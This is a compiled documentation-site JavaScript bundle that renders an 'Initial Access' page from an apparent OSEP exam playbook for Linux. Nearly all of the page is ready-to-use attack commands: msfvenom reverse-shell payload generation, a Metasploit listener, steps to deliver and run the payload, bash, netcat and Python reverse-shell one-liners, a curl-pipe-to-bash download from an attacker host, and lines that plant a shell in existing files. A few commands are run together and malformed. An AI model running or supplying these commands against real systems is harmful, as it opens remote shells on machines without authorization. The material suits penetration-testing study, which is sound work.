"use strict";(globalThis.webpackChunkmy_docs=globalThis.webpackChunkmy_docs||[]).push([[2919],{8043(e,n,s){s.r(n),s.d(n,{assets:()=>c,contentTitle:()=>o,default:()=>d,frontMatter:()=>i,metadata:()=>t,toc:()=>a});const t=JSON.parse('{"id":"osep/Linux/Initial Access","title":"Initial Access","description":"Initial Access","source":"@site/docs/osep/Linux/Initial Access.md","sourceDirName":"osep/Linux","slug":"/osep/Linux/Initial Access","permalink":"/OSEP-Playbook/docs/osep/Linux/Initial Access","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"Spray Credentials","permalink":"/OSEP-Playbook/docs/osep/Credentials/Spray Credentials"},"next":{"title":"Lateral Movement","permalink":"/OSEP-Playbook/docs/osep/Linux/Lateral Movement"}}');var r=s(4848),l=s(8453);const i={},o=void 0,c={},a=[{value:"<strong>Initial Access</strong>",id:"initial-access",level:3},{value:"<strong>Meterpreter</strong>",id:"meterpreter",level:3},{value:"<strong>Reverse Shells</strong>",id:"reverse-shells",level:3},{value:"<strong>Listener</strong>",id:"listener",level:3},{value:"<strong>Bash</strong>",id:"bash",level:3},{value:"<strong>Netcat</strong>",id:"netcat",level:3},{value:"<strong>Python</strong>",id:"python",level:3}];function h(e){const n={code:"code",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",...(0,l.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.h3,{id:"initial-access",children:(0,r.jsx)(n.strong,{children:"Initial Access"})}),"\n",(0,r.jsx)(n.h3,{id:"meterpreter",children:(0,r.jsx)(n.strong,{children:"Meterpreter"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Steps"})}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:"Craft your payload"}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Alternatively, use msfvenom to create an ELF payload\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=[ATTACKER_IP] LPORT=[PORT] -f elf -o shell.elf\nmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[ATTACKER_IP] LPORT=[PORT] -f elf -o shell.elf\n\n# If the target machine allows Bash scripts to execute\nmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[ATTACKER_IP] LPORT=[PORT] -f bash -o payload.sh\n\n# Useful if Python is available on the target\nmsfvenom -p python/meterpreter/reverse_tcp LHOST=[ATTACKER_IP] LPORT=[PORT] -f raw -o payload.py\n\n"})}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:"Start your listener"}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'sudo msfconsole -q -x "use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set lhost [ATTACKER_IP]; set lport [PORT]; exploit"\n\n'})}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:["Deliver it to the user, remember that if it is a\xa0",(0,r.jsx)(n.code,{children:".elf"}),"\xa0it needs to be added the permission for execution and then execute"]}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"chmod +x ./shell.elf\n\n./shell.elf\n\n"})}),"\n",(0,r.jsx)(n.h3,{id:"reverse-shells",children:(0,r.jsx)(n.strong,{children:"Reverse Shells"})}),"\n",(0,r.jsx)(n.h3,{id:"listener",children:(0,r.jsx)(n.strong,{children:"Listener"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"nc -nvlp [PORT]\n\n"})}),"\n",(0,r.jsx)(n.h3,{id:"bash",children:(0,r.jsx)(n.strong,{children:"Bash"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Normal Request"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Direct Bash reverse shell\n/bin/bash -i >& /dev/tcp/<TARGET_IP>/<TARGET_PORT>0>&1# Add the reverse shell to an existing file\necho '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' >> shell.sh\n./shell.sh\n\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"One-Liners"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# FIFO method with Netcat\nrm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i2>&1 | nc <TARGET_IP> <TARGET_PORT> >/tmp/f\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i2>&1|nc <TARGET_IP> <TARGET_PORT> >/tmp/f\n\n# Using 'sh' for reverse shell\nsh -i >& /dev/tcp/<TARGET_IP>/<TARGET_PORT>0>&1# Downloading a script\ncurl http://[ATTACKER_IP]/s.sh | bash\n\n"})}),"\n",(0,r.jsx)(n.h3,{id:"netcat",children:(0,r.jsx)(n.strong,{children:"Netcat"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Using -e\nnc <TARGET_IP> <TARGET_PORT> -e /bin/sh\nnc -nv <TARGET_IP> <TARGET_PORT> -e /bin/bash\n\n# Without -e option\nmkfifo /tmp/f; nc <TARGET_IP> <TARGET_PORT> < /tmp/f | /bin/sh > /tmp/f2>&1; rm /tmp/f\n\n# Add the reverse shell to an existing file\necho 'nc [lhost] [lport] -e /bin/bash' >> [file]\n\n"})}),"\n",(0,r.jsx)(n.h3,{id:"python",children:(0,r.jsx)(n.strong,{children:"Python"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<TARGET_IP>",<TARGET_PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'\n\n# Alternative Python Reverse Shell Payload\necho \'import socket,subprocess,os;s=socket.socket();s.connect(("<your_ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\' > shell.py\n\n'})})]})}function d(e={}){const{wrapper:n}={...(0,l.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(h,{...e})}):h(e)}},8453(e,n,s){s.d(n,{R:()=>i,x:()=>o});var t=s(6540);const r={},l=t.createContext(r);function i(e){const n=t.useContext(l);return t.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:i(e.components),t.createElement(l.Provider,{value:n},e.children)}}}]);